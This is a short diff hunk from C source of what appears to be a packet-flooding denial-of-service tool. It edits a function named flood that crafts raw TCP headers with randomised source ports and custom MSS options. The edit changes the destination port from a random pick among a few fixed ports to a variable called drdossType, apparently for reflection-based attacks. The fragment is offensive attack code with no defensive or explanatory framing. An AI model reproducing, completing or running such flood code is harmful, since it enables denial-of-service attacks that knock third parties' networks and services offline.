@@ -344,19 +344,19 @@ void *flood(void *par1)
 			{
 				if (randnum(0, 1) == 1)
 				{
-					tcph->dest = htons(sPorts[randnum(0, 4)]);
+					tcph->dest = htons(drdossType);
 					tcph->source = htons(randnum(1024, 65535));
 				}
 				else
 				{
-					tcph->dest = htons(sPorts[randnum(0, 4)]);
+					tcph->dest = htons(drdossType);
 					tcph->source = htons(randnum(1, 65535));
 				}
 			}
 			else
 			{
 				tcph->source = htons(floodport);
-				tcph->dest = htons(sPorts[randnum(0, 4)]);
+				tcph->dest = htons(drdossType);
 			}
 			opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
 			setup_tcpopts_header(opts);
